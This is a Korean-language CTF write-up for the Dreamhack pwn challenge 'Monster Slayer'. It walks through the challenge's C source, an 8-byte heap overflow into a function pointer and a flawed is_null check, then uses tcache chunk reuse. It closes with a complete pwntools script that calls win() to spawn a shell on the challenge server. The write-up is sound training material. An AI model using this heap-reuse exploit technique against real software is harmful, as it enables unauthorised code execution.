# Monster Slayer - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: chall.c, chall(ELF)
- tools:
## Brief Description
Use your power to defeat the monster.
## Initial Analysis
### Environment
``` sh
checksec chall
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
struct Character {
    char name[0x10];
    int64_t hp;
    uint64_t type;
    char profile[0x30];
    int (*skill)();
};

struct Monster {
    char name[0x10];
    int64_t hp;
    char info[0x30];
    int (*skill)();
};
```
`Character`와 `Monster` 구조체로, 0x8 바이트 만큼의 크기 차이가 있다.  
``` c
int is_null(void** ptr) {
    return *ptr == NULL;
}

void generate_character(struct Character *c1) {
    if (!is_null(c1)) return;
    
    ssize_t len;

    printf("Character name: ");
    len = read(0, c1->name, 0x10);
    if (c1->name[len-1] == '\n') c1->name[len-1] = '\0';

    c1->type = rand() % 3;
    c1->hp = 200;

    printf("Character profile: ");
    len = read(0, c1->profile, 0x38);
    if (c1->profile[len-1] == '\n') c1->profile[len-1] = '\0';

    switch (c1->type) {
        case 0: c1->skill = warrior_skill[rand() % 3]; break;
        case 1: c1->skill = mage_skill[rand() % 3]; break;
        case 2: c1->skill = archer_skill[rand() % 3]; break;
    }

    puts("\nYour character info:");
    printf("Name: %s\n", c1->name);
    printf("HP: %d\n", c1->hp);
    printf("Role: %s\n", c1->type == 0 ? "Warrior" : c1->type == 1 ? "Mage" : "Archer");
    printf("Profile: %s\n", c1->profile);
    c1->skill();
    printf("\n");
    
}

void generate_monster(struct Monster *m1) {
    if (!is_null(m1)) return;

    int r = rand() % 3;

    strcpy(m1->name, monster_name[r]);
    m1->hp = 500;
    strcpy(m1->info, monster_info[r]);
    m1->skill = monster_skill[r];

    puts("\nMonster info:");
    printf("Name: %s\n", m1->name);
    printf("Info: %s\n", m1->info);
    printf("HP: %d\n", m1->hp);
    m1->skill();
    printf("\n");
}
```
`Character`와 `Monster` 구조체를 초기화 한다. 만일 파라미터의 구조체가 초기화 되어 있다면, 즉시 리턴한다.  
``` c
void win() {    
    execve("/bin/sh", 0, 0);
}
```
`execve()` 함수를 이용해 `"/bin/sh"`을 실행한다.  
``` c
int main() {
    int pos, slot;
    struct Character *c[3] = {0,};
    struct Monster *m = 0;
    
    init();
    title();
    
    while(1) {
        menu();
        printf(">> ");
        scanf("%d", &pos);

        if (pos == 6) exit(0);

        if (pos != 4) {
            printf("\n");
            printf("Choose your character slot(1~3): ");
            scanf("%d", &slot);

            if (slot < 1 || slot > 3) {
                printf("Invalid input!!\n");
                exit(0);
            }

            slot--;
        }

        switch(pos) {
            case 1:
                if (!c[slot]) {
                    c[slot] = malloc(sizeof(struct Character));
                    printf("Slot created success.\n");
                } else {
                    printf("You already have this slot!\n\n");
                }
                break;
            case 2:
                if (!c[slot]) {
                    printf("There is no slot!\n\n");
                } else {
                    generate_character(c[slot]);
                }
                break;
            case 3:
                if (!c[slot]) {
                    puts("There is no character in this slot!\n");
                } else {
                    free(c[slot]);
                    c[slot] = 0;
                    puts("Character deleted.\n");
                }
                break;
            case 4:
                if (!m) {
                    m = malloc(sizeof(struct Monster));
                }
                generate_monster(m);
                break;
            case 5:
                if (!m) {
                    puts("Generate a monster first.\n");
                } else if (c[slot] == 0 || is_null(c[slot])) {
                    puts("There is no character in this slot!\n");
                } else {
                    slay_monster(c[slot], m);
                }
                break;
            default:
                puts("Invalid selection.\n");
                break;
        }
    }

    return 0;
}
```
`main()`함수 로직이다. `Character`를 `free()`한 후, 해당 `spot`을 0으로 초기화 한다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
printf("Character profile: ");
len = read(0, c1->profile, 0x38);
```
`charactet.profile` 크기는 `0x30`인 반면, `read`로 읽어오는 크기는 `0x38`로 `0x8` 만큼 BOF가 발생한다. 이를 통해 `character.skill` 8 byte를 덮어쓸 수 있다.  
### Use of Uninitialized Memory
``` c
int is_null(void** ptr) {
    return *ptr == NULL;
}
```
`is_null()`을 사용하는 로직을 보면, 원래 의도는 전달 받은 구조체(character, monster) 포인터가 NULL인지 확인하는 목적으로 생각되지만, 코드 작성을 잘못하여 해당 구조체의 `name`이 NULL인이 판단한다. 해당 구현 실수로 인해 Use of Uninitialized Memory 취약점이 발생할 수 있다.  
## Exploit
### Strategy
![](/Resources/images/Monster_Slayer.jpg "Monster Slayer")
BOF 취약점이 존재하여 `character.profile`을 입력할 때 `character.skill`을 덮어쓸 수 있지만, 덮어쓴 직후 skill을 바로 초기화 하므로 큰 의미가 없다.  
한 가지 눈여겨볼 사실은 `character` 구조체와 `monster` 구조체의 크기가 0x8 바이트 정도밖에 차이가 나지 않는다는 것이다. 또한 구조체를 `free()`하는 과정에서 어떠한 초기화도 진행하지 않는다. 따라서 해당 바이너리가 메모리 할당 과정에서 `ptmalloc2`를 사용한다면, `character.profile`의 상위 0x8 바이트 위치(메모리에 올라가는 위치 기준)에 `win()` 함수를 덮어쓰고 `free()`한 후 `monster` 구조체를 할당할 때 `tcache`에서 초기화되지 않은 `character`의 청크를 그대로 사용하게 된다. 이를 통해서 `monster`의 스킬로 `win` 함수를 트리거할 수 있다. 단, `monster` 구조체 초기화를 우회해야 하는데, 이는 `is_null` 함수 구현의 실수를 이용하면 구조체 초기화를 진행하지 않으므로 우회가 가능하다. 최종적인 익스플로잇 과정은 다음과 같다.  
1. `Character` slot 3개를 생성한다.
2. `Character` slot 3개 모두 캐릭터 초기화. 단, name을 채우고, profile 영역의 상위 0x8 바이트에 `win()` 함수의 주소를 덮는다.
3. `Character` slot 3개를 모두 삭제(free)한다.
4. `Monster`를 생성한다. 이때 `tcache`의 청크를 가져와 할당한다.
5. `is_null()` 함수를 통해 몬스터 초기화를 우회한다.
6. `slay_monster()`를 진행하여, `win()` 함수를 트리거 한다.
### Exploitation Steps
``` sh
$ ldd ./chall
        linux-vdso.so.1 (0x00007ffdbbdee000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f44b7bfd000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f44b7e30000)
```
libc.so.6가 출력되므로, 해당 바이너리는 GNU C 라이브러리 (glibc)를 사용한다. 최신 버전의 glibc는 기본적으로 ptmalloc2를 힙 할당자로 사용하는 것으로 알고 있다.  
``` sh
$ readelf -s ./chall | grep malloc
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5
$ nm -D ./chall | grep malloc
                 U malloc@GLIBC_2.2.5
```
실제로 glibc를 사용하는 것을 확인할 수 있다. 여기서 `U` 또는 `UND`는 `'Undefined'` 심볼로, 이 바이너리 자체에는 없고 외부 라이브러리(이 경우 glibc)에서 가져와야 하는 함수라는 것을 의미한다.  
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 16078) 

win_addr = 0x0000000000401c42
target_info = b"Slashes enemies fast with deadly claws."
payload = b'A' * 0x28 + p64(win_addr)

def createSlot(slot) :
    p.sendlineafter(b'>> ', b'1') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot

def generateCharacter(slot) :
    p.sendlineafter(b'>> ', b'2') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot
    p.sendlineafter(b'Character name: ', b'good') # name
    p.sendlineafter(b'Character profile: ', payload) # profile

def deleteSlot(slot) :
    p.sendlineafter(b'>> ', b'3') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot

def generateMonster() :
    p.sendlineafter(b'>> ', b'4') # pos

def slayMonster() :
    p.sendlineafter(b'>> ', b'5')
    p.sendlineafter(b'Choose your character slot(1~3): ', b'1') # slot


# create Character slot
for i in range(1, 4) :
    createSlot(i)
    generateCharacter(i)

# delete slot
for i in range(1, 4) :
    deleteSlot(i) # tcache -> 3 -> 2 -> 1

# create monster
generateMonster() # allocated character's slot 3

# create Character slot
createSlot(1)

# slay monster
slayMonster()

# interactive
p.interactive()
```
